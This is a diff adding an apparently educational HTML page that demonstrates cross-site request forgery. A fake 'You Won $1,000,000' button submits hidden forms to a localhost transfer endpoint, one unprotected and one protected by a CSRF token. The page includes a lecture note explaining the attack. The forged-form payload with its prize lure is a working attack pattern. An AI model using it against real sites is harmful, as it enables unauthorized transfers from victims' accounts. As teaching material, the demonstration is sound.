@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>You Won a Prize! - totally-not-evil.com</title>
+    <style>
+        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 50px; }
+        h1 { color: gold; font-size: 3em; }
+        p { font-size: 1.2em; }
+        .warning { margin-top: 60px; border-top: 2px dashed red; padding-top: 20px; color: #aaa; font-size: 0.85em; text-align: left; }
+    </style>
+</head>
+<body>
+
+    <h1>YOU WON $1,000,000!</h1>
+    <p>Click below to claim your prize!</p>
+
+    <!-- This is what the victim sees -->
+    <button onclick="document.getElementById('visibleForm').submit()" style="font-size:2em; padding:20px 40px; background:gold; cursor:pointer;">
+        CLAIM PRIZE NOW
+    </button>
+
+    <!-- Visible fake form (what the user thinks they're submitting) -->
+    <form id="visibleForm" method="post" action="https://localhost:8443/transfer?safe=false">
+        <input type="hidden" name="amount" value="99999"/>
+        <input type="hidden" name="to" value="hacker@evil.com"/>
+        <!-- NO csrfToken — attacker doesn't know it -->
+    </form>
+
+    <hr style="margin-top:80px"/>
+
+    <!-- EXPLANATION for the lecture -->
+    <div class="warning">
+        <h3 style="color:red">[LECTURE NOTE - this text would NOT exist on a real evil.com]</h3>
+        <p>What just happened when you clicked "CLAIM PRIZE":</p>
+        <ul style="text-align:left">
+            <li>This page (evil.com) submitted a POST to <b>https://localhost:8443/transfer?safe=false</b></li>
+            <li>Your browser automatically sent your <b>localhost:8443 session cookie</b> with the request</li>
+            <li>The server saw a valid session and <b>executed the transfer</b> — no questions asked</li>
+            <li>The attacker never needed your password, never hacked your server</li>
+        </ul>
+        <p style="color:gold">Now try the same but against the PROTECTED endpoint:
+            <button onclick="document.getElementById('blockedForm').submit()" style="background:darkred; color:white; padding:10px 20px; cursor:pointer;">
+                Attack Protected Endpoint
+            </button>
+        </p>
+        <form id="blockedForm" method="post" action="https://localhost:8443/transfer?safe=true">
+            <input type="hidden" name="amount" value="99999"/>
+            <input type="hidden" name="to" value="hacker@evil.com"/>
+            <!-- No csrfToken — attacker cannot know it! -->
+        </form>
+        <p>This should be <b style="color:red">BLOCKED</b> because no csrfToken is sent.</p>
+    </div>
+
+</body>
+</html>
+
